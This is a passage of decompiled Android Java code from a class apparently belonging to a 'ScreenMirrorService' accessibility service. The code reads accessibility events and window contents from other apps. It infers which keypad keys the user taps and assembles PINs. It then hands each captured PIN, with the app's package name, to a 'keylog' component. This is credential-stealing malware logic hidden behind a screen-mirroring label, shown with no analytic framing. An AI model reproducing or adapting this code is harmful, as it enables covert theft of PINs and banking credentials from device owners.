                        for (Map.Entry entry : this.f4686h.entrySet()) {
                            Rect rect = (Rect) entry.getValue();
                            if (Rect.intersects(rectC, rect) || rectC.contains(rect.centerX(), rect.centerY())) {
                                long jCenterX = rectC.centerX() - rect.centerX();
                                long jCenterY = rectC.centerY() - rect.centerY();
                                long j6 = (jCenterY * jCenterY) + (jCenterX * jCenterX);
                                if (j6 < j5) {
                                    ch = (Character) entry.getKey();
                                    j5 = j6;
                                }
                            }
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                }
                return ch;
            }
        }
        return null;
    }

    public final void i(long j3, String str, String str2, String str3) {
        if (str == null || str.length() < 4) {
            return;
        }
        String str4 = n(str2) + "|" + str;
        Long l3 = (Long) this.f4684f.get(str4);
        if (l3 == null || j3 - l3.longValue() >= 30000) {
            this.f4684f.put(str4, Long.valueOf(j3));
            j5 j5Var = this.f4680b.f3491d.R5;
            if (j5Var == null) {
                Log.w("ScreenMirror", "[AppPin] drop pin capture: keylog not ready");
                return;
            }
            if (!str.isEmpty()) {
                j5Var.l(new g2.l(j5Var, str2 == null ? "" : str2, str3, str));
            }
            StringBuilder sb = new StringBuilder("[AppPin] pin captured len=");
            sb.append(str.length());
            sb.append(" via=");
            sb.append(str3);
            sb.append(" pkg=");
            a0.a.o(sb, str2, "ScreenMirror");
        }
    }

    public final void j() {
        synchronized (this.f4685g) {
            this.f4686h.clear();
            this.f4687i = "";
            this.f4688j = -1L;
        }
    }

    /* JADX WARN: Code duplicated, block: B:43:0x00aa  */
    public final void l(AccessibilityEvent accessibilityEvent) throws Throwable {
        Throwable th;
        String string;
        Character chH;
        int eventType = accessibilityEvent.getEventType();
        String strN = n(accessibilityEvent.getPackageName());
        if (strN.isEmpty()) {
            strN = this.n;
        }
        String str = strN;
        if (j5.F(str, false)) {
            return;
        }
        this.f4682d.getClass();
        long jUptimeMillis = SystemClock.uptimeMillis();
        String string2 = null;
        chR = null;
        chR = null;
        Character chR = null;
        AccessibilityNodeInfo accessibilityNodeInfo = null;
        if (eventType != 1) {
            if (eventType != 32 && eventType != 4194304) {
                if (eventType == 2048) {
                    if (!str.isEmpty()) {
                        this.n = str;
                    }
                    this.f4691m = s(str, this.n);
                    dc dcVar = this.f4681c;
                    h1 h1Var = this.f4699v;
                    dcVar.i(h1Var);
                    dcVar.h(200L, h1Var);
                    return;
                }
                return;
            }
            d2.a aVar = this.f4683e;
            synchronized (aVar) {
                int length = ((StringBuilder) aVar.f541e).length();
                StringBuilder sb = (StringBuilder) aVar.f541e;
                if (length < 4) {
                    sb.setLength(0);
                } else {
                    string2 = sb.toString();
                    sb.setLength(0);
                }
            }
            i(jUptimeMillis, string2, this.f4689k, this.f4690l);
            this.f4681c.i(this.f4695r);
            if (!str.isEmpty()) {
                this.n = str;
            }
            j();
            dc dcVar2 = this.f4681c;
            dcVar2.i(this.f4696s);
            dcVar2.i(this.f4697t);
            dcVar2.i(this.f4698u);
            dcVar2.i(this.f4699v);
            dcVar2.i(this.f4700w);
            this.f4691m = s(str, this.n);
            dc dcVar3 = this.f4681c;
            dcVar3.h(0L, this.f4696s);
            dcVar3.h(300L, this.f4697t);
            dcVar3.h(1000L, this.f4698u);
            return;
        }
        if (!str.isEmpty()) {
            this.n = str;
        }
        d2.a aVar2 = this.f4683e;
        try {
            AccessibilityNodeInfo source = accessibilityEvent.getSource();
            try {
                String strN2 = source != null ? n(source.getContentDescription()) : n(accessibilityEvent.getContentDescription());
                if (source != null) {
                    string = n(source.getText());
                } else {
                    try {
                        List<CharSequence> text = accessibilityEvent.getText();
                        if (text == null || text.isEmpty()) {
                            string = "";
                        } else {
                            StringBuilder sb2 = new StringBuilder();
                            for (CharSequence charSequence : text) {
                                if (charSequence != null) {
                                    sb2.append(charSequence);
                                }
                            }
                            string = sb2.toString();
                        }
                    } catch (Throwable unused) {
                    }
                }
                if (strN2 == null || strN2.isEmpty()) {
                    chH = null;
                } else {
                    Matcher matcher = f4677x.matcher(strN2);
                    if (matcher.matches()) {
                        chH = r(matcher.group(1));
                    } else {
                        chH = null;
                    }
                }
                if (chH == null) {
                    if (string != null && !string.isEmpty()) {
                        Matcher matcher2 = f4677x.matcher(string);
                        if (matcher2.matches()) {
                            chR = r(matcher2.group(1));
                        }
                    }
                    chH = chR;
                }
                Character chR2 = r(string);
                if (chH == null && chR2 != null) {
                    if (!aVar2.b(str, jUptimeMillis)) {
                        p(str);
                    }
                    if (aVar2.b(str, jUptimeMillis)) {
                        chH = chR2;
                    }
                }
                if (chH == null) {
                    if (!aVar2.b(str, jUptimeMillis)) {
                        p(str);
                    }
                    chH = h(jUptimeMillis, source, str);
                }
                if (chH != null) {
                    e(chH.charValue(), source, str);
                    a(chH.charValue(), str, "click-seq", jUptimeMillis);
                    q(str);
                    if (source == null) {
                        return;
                    }
                } else {
                    if (strN2.isEmpty()) {
                        strN2 = string;
                    }
                    if (f4678y.matcher(strN2).matches()) {
                        aVar2.d(jUptimeMillis);
                        q(str);
                    } else if (aVar2.b(str, jUptimeMillis)) {
                        q(str);
                    }
                    if (source == null) {
                        return;
                    }
                }
                try {
                    source.recycle();
                } catch (Throwable unused2) {
                }
            } catch (Throwable th2) {
                th = th2;
                accessibilityNodeInfo = source;
                if (accessibilityNodeInfo == null) {
                    throw th;
                }
                try {
                    accessibilityNodeInfo.recycle();
                    throw th;
                } catch (Throwable unused3) {
                    throw th;
                }
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }

    public final void p(String str) {
        AccessibilityNodeInfo root;
        ScreenMirrorService screenMirrorService = this.f4679a;
        if (screenMirrorService == null) {
            return;
        }
        this.f4682d.getClass();
        long jUptimeMillis = SystemClock.uptimeMillis();
        try {
            List<AccessibilityWindowInfo> windows = screenMirrorService.getWindows();
            if (windows == null) {
                return;
            }
            String strS = s(str, this.n);
            boolean zB = false;
            for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                if (accessibilityWindowInfo != null) {
                    int type = accessibilityWindowInfo.getType();
                    if (type != 2 && type != 4 && (root = accessibilityWindowInfo.getRoot()) != null) {
                        try {
                            String strN = n(root.getPackageName());
                            boolean zIsEmpty = strN.isEmpty();
                            String str2 = strN;
                            if (zIsEmpty) {
                                str2 = strS;
                            }
                            if (!j5.F(str2, false) && (strS.isEmpty() || strS.equals(str2))) {
                                n1 n1Var = new n1(0);
                                o(root, n1Var, null);
                                zB |= b(str2, n1Var, jUptimeMillis);
                            }
                            root.recycle();
                        } catch (Throwable th) {
                            try {
                                root.recycle();
                            } catch (Throwable unused) {
                            }
                            throw th;
                        }
                    }
                }
            }
            if (zB || strS.isEmpty()) {
                return;
            }
            synchronized (this.f4685g) {
                try {
                    if (strS.equals(this.f4687i)) {
                        this.f4686h.clear();
                        this.f4687i = "";
                        this.f4688j = -1L;
                    }
                } catch (Throwable th2) {
                    throw th2;
                }
            }
        } catch (Throwable unused2) {
        }
    }

    public final void q(String str) {
        this.f4691m = s(str, this.n);
        dc dcVar = this.f4681c;
        h1 h1Var = this.f4700w;
        dcVar.i(h1Var);
        dcVar.h(350L, h1Var);
    }
}
